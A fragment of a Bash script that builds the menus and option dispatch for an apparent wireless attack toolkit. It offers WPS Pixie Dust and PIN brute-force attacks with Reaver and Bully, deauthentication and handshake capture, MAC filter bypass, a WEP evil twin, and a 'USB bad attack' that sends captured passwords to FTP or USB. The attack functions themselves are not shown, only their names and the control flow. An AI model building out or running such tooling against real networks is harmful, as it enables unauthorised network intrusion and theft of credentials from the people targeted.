echo -e  "$BCyan 1)Select Interface You Want To Use And  Enable Monitor Mode On It " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 2)Select Target Network  You Want To Test It Security " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 3)Crack Handshake with WPA2/WPA Heart-bleed-probes Brute-force [Still Experimental] $blink " && sleep 0.1  
choise "{Probalk}"
echo -e  "$BCyan 4)USB bad Attack + social enginnring Send Password to  ftp / usb (targeted system  should be windows )  " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 5)Advenced WPS Attacks( Pixie Dust / Bruteforce /Mac Filter /Hidden Acces Point)  " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 6)Capture Handshake With Airodump-ng (Deauth attack with aireplay-ng ) " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 7)Boost your Wifi Adapter By Incrising Tx-Power " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 8)Encrypted Evil Twin With WEP ( Caffe-Latte attack + aircrack-ng )[ Will Be Improved Next Version ]$blink" && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 9)Disable Monitor Mode and $BRed EXIT" && sleep 0.1

}

heartmainpage(){
defstartsoyalk
trap control_c SIGINT SIGTERM SIGHUP
echo -e $Yellow "What Kind Of Heart-Bleed-probes Would You Like To Use (booth are Experimental ): "
choise "{Probalk}"
echo -e "$Cyan 1) With MDK3 Deauth Attack"
choise "{Probalk}"
echo -e "$Cyan 2)Without Deauth Attack"
choise "{Probalk}"
h=0

while [ $h = 0 ]   
do
read -p " Enter The Number Of Your Choise:" choiseheart
      case "$choiseheart" in
	1)
	heartwithmdk
	h=1
	;;
	2)
	heartwithout
	h=1
	;;
	*)
	h=0	
	echo "Invalide choise ..."
	;;
      esac
done



}


wpsfunchoses(){
choise "{Probalk}" && sleep 0.1 
echo -e  "$BCyan 1) Pixe Dust Attack Using Reaver" && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 2) Pixe Dust Attack Using Bully (recommended if you have Ralink chipset)" && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 3) Default Pin With Reaver(if exist) " && sleep 0.1  
choise "{Probalk}"
echo -e  "$BCyan 4) WPS Pin Brute-force Reaver (May lock New Versions Of WPS ) " && sleep 0.1  
choise "{Probalk}"
echo -e  "$BCyan 5) WPS Pin Brute-force Bully (May lock New Versions Of WPS ) " && sleep 0.1  
choise "{Probalk}"
echo -e  "$BCyan 6) Custom Pin with Reaver" && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 7) Custom Pin with Bully" && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 8)Hidden Acces Points (Choose It If The Targeted Network Is Hidden) " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 9) Bypass MAC Filter (Against Blacklist / whitelist)" && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 10) Back To start Menu " && sleep 0.1
choise "{Probalk}"
echo -e  "$BCyan 11) Disable Monitor Mode and $BRed EXIT" && sleep 0.1



}


###
ifinput(){


x=0

while [ $x = 0 ]   
do
      read -p "Choose one option  :" option 
      case "$option" in
      1) 
      enablemonitormode
      x=1
      ;;

      2) 
      selectarget
      x=1
      ;;

      3) 
	heartmainpage
      x=1
      ;;

      4)	
	usbbadmain
      x=1
      ;;

      5) 
	wpsmainpage
      x=1
      ;;


      6) 
	handcapture
	mainpage
      x=1
      ;;
      7) 
      txpower
      x=1
      ;;
      9) 
      control_c
      x=1
      ;;
      8) 
      evil_twin_wep
mainpage
      x=1
      ;;

      *) 
      echo "invalide choise"
      sleep 2
      x=0
	mainpage
      ;;
      esac
done
   
}


ifinputwps(){


x=0

while [ $x = 0 ]   
do
      read -p "Choose one option  :" optionwps 
      case "$optionwps" in
      1) 
	pixiewpsrever
      x=1
	wpsmainpage
      ;;

      2) 
	pixiewpsbully
      x=1
	wpsmainpage
      ;;

      3) 
	defaultpinreaver
      x=1
	wpsmainpage
      ;;

      4) 
	brueteforcepinreaver
      x=1
	wpsmainpage
      ;;

      5) 
	bruteforcepinbully
      x=1
	wpsmainpage
      ;;


      6) 
	cutompinreaver
      x=1
	wpsmainpage
      ;;
      7) 
	cutompinbully
      x=1
      ;;
      8) 
	checkhidden
      x=1
	wpsmainpage
      ;;
	9) 
	macspoof
      x=1
	wpsmainpage
      ;;
	10) 
	mainpage
      x=1
      ;;

      11) 
	control_c
	x=1
	;;
      *) 
      echo "invalide choise"
      sleep 2
      x=0
	wpsmainpage
      ;;
      esac
done   
}
wpsmainpage(){
trap control_c SIGINT SIGTERM SIGHUP
defstartsoyalk
wpsfunchoses
printselected
ifinputwps
}
mainpage(){
trap control_c SIGINT SIGTERM SIGHUP
sleep 0.1
defstartsoyalk
sleep 0.05
choises
printselected
rm -rf $filecsv 2>/dev/null
ifinput
}
mainpage
#############################	echo "[+] Running reaver with the pin :$pin"

